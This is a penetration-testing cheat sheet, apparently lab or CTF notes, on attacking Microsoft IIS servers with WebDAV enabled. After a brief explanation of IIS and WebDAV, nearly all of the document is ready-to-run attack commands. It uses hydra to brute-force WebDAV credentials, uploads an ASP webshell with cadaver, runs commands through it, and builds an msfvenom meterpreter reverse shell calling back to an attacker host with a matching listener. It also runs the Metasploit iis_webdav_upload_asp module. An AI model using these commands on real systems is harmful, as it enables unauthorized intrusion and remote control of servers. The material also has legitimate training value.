# Microsoft IIS WebDAV

# Explanation

## Microsoft IIS (Internet Information Services)

Proprietary web server software developed by Microsoft that runs on Windows.

IIS can be used to host static and dynamic web pages developed in ASP.NET and PHP.

Typically configured to run on ports TCP/80 and TCP/443.

- Supported executable file extensions :
    - .asp
    - .aspx
    - .config
    - .php

# WebDAV (Web Distributed Authoring & Versioning)

HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server.

WebDAV essentially enables a web server to function as a file server for collaborative authoring.

WebDAV runs on top Microsoft IIS on ports TCP/80 and TCP/443.

In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of username and password.

# Exploit

## Bruteforce /webdav authentication page

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```

## Upload webshell

```
davtest -url http://10.2.17.124/webdav
davtest -auth bob:password -url http://10.2.17.124/webdav
```
```
cadaver http://10.2.17.124/webdav
Username:
Password:
dav:/webdav/>
dav:/webdav/> ls
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

And interaction with webshell :
```
http://10.2.17.124/webdav/webshell.asp?cmd=ipconfig
http://10.2.17.124/webdav/webshell.asp?cmd=dir+C%3A\
http://10.2.21.182/webdav/webshell.asp?cmd=type%20dir+C%3A\flag.txt
```

## Upload reverse shell

### Scenario 1

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
```

```
cadaver http://10.2.17.124/webdav
Username:
Password:
dav:/webdav/>
dav:/webdav/> ls
dav:/webdav/> put /root/shell.asp
```

```
service postgresql start && msfconsole
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.5.2
msf6 > set LPORT 1234
msf6 > run
meterpreter > sysinfo
meterpreter > getuid
```

### Scenario 2

```
msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
msf6 > set HttpUsername bob
msf6 > set HttpPassword password_123321
msf6 > set RHOSTS 10.2.30.233
msf6 > set PATH /webdav/metasploit.asp
msf6 > run
meterpreter > sysinfo
meterpreter > getuid
```

# Tools

- [Hydra](https://www.kali.org/tools/hydra/)
- [Davtest](https://www.kali.org/tools/davtest/)
- [Cadaver](https://salsa.debian.org/debian/cadaver)